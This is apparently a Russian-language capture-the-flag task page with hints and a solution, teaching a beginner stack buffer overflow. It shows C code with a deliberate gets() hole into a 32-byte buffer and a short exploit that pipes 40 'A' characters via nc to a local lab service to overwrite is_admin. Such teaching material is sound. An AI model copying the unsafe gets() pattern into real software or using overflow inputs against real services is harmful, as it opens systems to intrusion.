## Описание для участников

> Программа читает ваш ввод в небольшой буфер.
> Что будет, если ввести слишком много символов?
>
> `nc localhost 5019`
>
> Исходный код прилагается для изучения.

## Подсказки

1. Посмотри на размер буфера в коде
2. Что происходит с переменной `is_admin`?
3. Попробуй ввести много символов

## Способ решения

### Анализ кода
```c
char buffer[32];       // Буфер на 32 байта
int is_admin = 0;      // Переменная после буфера

gets(buffer);          // Небезопасная функция!

if (is_admin != 0) {   // Если перезаписать is_admin
    printf(FLAG);      // Получим флаг!
}
```

### Эксплойт
```bash
# Вводим больше 32 символов
python3 -c "print('A' * 40)" | nc localhost 5019

# Или
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | nc localhost 5019
```

Когда мы вводим более 32 символов, лишние байты перезаписывают `is_admin`, делая его != 0.
